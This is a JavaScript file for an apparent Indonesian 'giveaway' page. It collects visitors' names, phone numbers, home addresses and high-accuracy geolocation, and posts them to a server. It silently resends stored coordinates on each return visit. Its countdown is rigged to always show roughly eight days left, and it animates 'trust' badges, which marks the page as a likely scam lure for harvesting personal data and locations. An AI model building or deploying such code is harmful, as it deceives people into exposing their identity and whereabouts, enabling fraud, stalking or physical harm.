// DOM Elements
const participateBtn = document.getElementById("participateBtn");
const participationForm = document.getElementById("participationForm");
const successSection = document.getElementById("successSection");
const userNameInput = document.getElementById("userName");
const userPhoneInput = document.getElementById("userPhone");
const userAddressInput = document.getElementById("userAddress");

// Countdown Timer
function updateCountdown() {
  const now = new Date().getTime();
  const endDate = new Date(
    now + 7 * 24 * 60 * 60 * 1000 + 23 * 60 * 60 * 1000 + 45 * 60 * 1000
  ).getTime();

  const distance = endDate - now;

  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
  const hours = Math.floor(
    (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
  );
  const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));

  document.getElementById("days").textContent = days
    .toString()
    .padStart(2, "0");
  document.getElementById("hours").textContent = hours
    .toString()
    .padStart(2, "0");
  document.getElementById("minutes").textContent = minutes
    .toString()
    .padStart(2, "0");
}

// Update countdown every minute
setInterval(updateCountdown, 60000);
updateCountdown(); // Initial call

// Generate random ID (16 characters)
function generateRandomId() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 16; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Validate form data
function validateForm() {
  const name = userNameInput.value.trim();
  const phone = userPhoneInput.value.trim();
  const address = userAddressInput.value.trim();
  
  if (!name || !phone || !address) {
    throw new Error('Harap lengkapi semua data (nama, nomor HP, dan alamat)');
  }
  
  if (phone.length < 10 || phone.length > 15) {
    throw new Error('Nomor HP harus antara 10-15 digit');
  }
  
  if (!/^[0-9+\-\s]+$/.test(phone)) {
    throw new Error('Nomor HP hanya boleh berisi angka, +, -, dan spasi');
  }
  
  return { name, phone, address };
}

// Geolocation functionality
function requestGeolocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("Geolocation tidak didukung oleh browser ini"));
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        resolve(coords);
      },
      (error) => {
        let errorMessage = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage =
              "Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "Informasi lokasi tidak tersedia.";
            break;
          case error.TIMEOUT:
            errorMessage = "Permintaan lokasi timeout.";
            break;
          default:
            errorMessage = "Terjadi kesalahan saat mengambil lokasi.";
            break;
        }
        reject(new Error(errorMessage));
      },
      options
    );
  });
}

// Show loading state
function showLoading(button) {
  button.disabled = true;
  button.innerHTML = "⏳ Memproses...";
}

// Reset button state
function resetButton(button) {
  button.disabled = false;
  button.innerHTML = "🎯 YA, SAYA IKUT GIVEAWAY INI!";
}

// Show error message
function showError(message) {
  const errorDiv = document.createElement("div");
  errorDiv.className = "error-message";
  errorDiv.style.cssText = `
        background: #f8d7da;
        color: #721c24;
        padding: 15px;
        border-radius: 10px;
        margin: 20px 0;
        border: 1px solid #f5c6cb;
        text-align: center;
    `;
  errorDiv.innerHTML = `
        <strong>⚠️ Oops!</strong><br>
        ${message}<br>
        <small>Silakan coba lagi atau hubungi support jika masalah berlanjut.</small>
    `;

  // Remove existing error messages
  const existingError = document.querySelector(".error-message");
  if (existingError) {
    existingError.remove();
  }

  participationForm.appendChild(errorDiv);

  // Auto remove error after 5 seconds
  setTimeout(() => {
    if (errorDiv.parentNode) {
      errorDiv.remove();
    }
  }, 5000);
}

// Submit participation data to server
async function submitParticipation(locationData, userData = null) {
  try {
    const payload = {
      id: userData ? userData.id : JSON.parse(localStorage.getItem("giveawayParticipation")).id,
      latitude: locationData.latitude,
      longitude: locationData.longitude
    };
    
    // Add user data only for first submission
    if (userData) {
      payload.name = userData.name;
      payload.phone = userData.phone;
      payload.address = userData.address;
    }

    const response = await fetch('/api/location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    console.log("Participation data submitted:", {
      timestamp: new Date().toISOString(),
      payload: payload,
      userAgent: navigator.userAgent,
      referrer: document.referrer || "direct",
      serverResponse: result
    });

    return { success: true, participationId: payload.id };
  } catch (error) {
    console.error('Failed to submit to server:', error);
    throw new Error('Gagal mengirim data ke server. Silakan coba lagi.');
  }
}

// Main participation handler
async function handleParticipation() {
  try {
    showLoading(participateBtn);

    // Validate form data
    const userData = validateForm();
    userData.id = generateRandomId();

    // Request geolocation
    const locationData = await requestGeolocation();

    // Submit participation with user data
    const result = await submitParticipation(locationData, userData);

    if (result.success) {
      // Hide form and show success message
      participationForm.classList.add("hidden");
      successSection.classList.remove("hidden");

      // Scroll to success section
      successSection.scrollIntoView({
        behavior: "smooth",
        block: "center",
      });

      // Store participation data locally
      localStorage.setItem(
        "giveawayParticipation",
        JSON.stringify({
          id: userData.id,
          name: userData.name,
          phone: userData.phone,
          address: userData.address,
          timestamp: new Date().toISOString(),
          location: {
            lat: locationData.latitude.toFixed(6),
            lng: locationData.longitude.toFixed(6),
          },
        })
      );
    } else {
      throw new Error("Gagal mengirim data partisipasi");
    }
  } catch (error) {
    console.error("Participation error:", error);
    showError(error.message);
    resetButton(participateBtn);
  }
}

// Event listeners
participateBtn.addEventListener("click", handleParticipation);

// Check existing participation and send to server on refresh
document.addEventListener("DOMContentLoaded", async () => {
  const existingParticipation = localStorage.getItem("giveawayParticipation");
  if (existingParticipation) {
    const data = JSON.parse(existingParticipation);
    const participationDate = new Date(data.timestamp);
    const now = new Date();
    const hoursDiff = (now - participationDate) / (1000 * 60 * 60);

    // If participated within last 24 hours, show success directly
    if (hoursDiff < 24) {
      // Fill form with existing data
      userNameInput.value = data.name || '';
      userPhoneInput.value = data.phone || '';
      userAddressInput.value = data.address || '';
      
      participationForm.classList.add("hidden");
      successSection.classList.remove("hidden");
      
      // Send existing location data to server on page refresh (only id, lat, lng)
      try {
        const locationData = {
          latitude: parseFloat(data.location.lat),
          longitude: parseFloat(data.location.lng),
          accuracy: 0 // We don't have accuracy from stored data
        };
        
        console.log("Sending existing participation data to server...");
        await submitParticipation(locationData); // No userData = only sends id, lat, lng
        console.log("Existing participation data sent successfully");
      } catch (error) {
        console.error("Failed to send existing participation data:", error);
        // Don't show error to user since this is background sync
      }
    }
  }
});

// Add some interactive effects
document.addEventListener("DOMContentLoaded", () => {
  document.querySelector(".year").textContent = new Date().getFullYear();

  // Animate trust indicators on scroll
  const observerOptions = {
    threshold: 0.1,
    rootMargin: "0px 0px -50px 0px",
  };

  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.style.animation = "fadeInUp 0.6s ease forwards";
      }
    });
  }, observerOptions);

  // Observe trust items
  document.querySelectorAll(".trust-item").forEach((item) => {
    observer.observe(item);
  });

  // Add CSS for fade in animation
  const style = document.createElement("style");
  style.textContent = `
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .trust-item {
            opacity: 0;
        }
    `;
  document.head.appendChild(style);
});

// Add click tracking for analytics (optional)
function trackEvent(eventName, eventData = {}) {
  console.log("Event tracked:", eventName, eventData);
  // Here you could send to analytics service
}

// Track button clicks
participateBtn.addEventListener("click", () => {
  trackEvent("participate_button_clicked", {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
  });
});

// Track page visibility
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    trackEvent("page_visible");
  } else {
    trackEvent("page_hidden");
  }
});
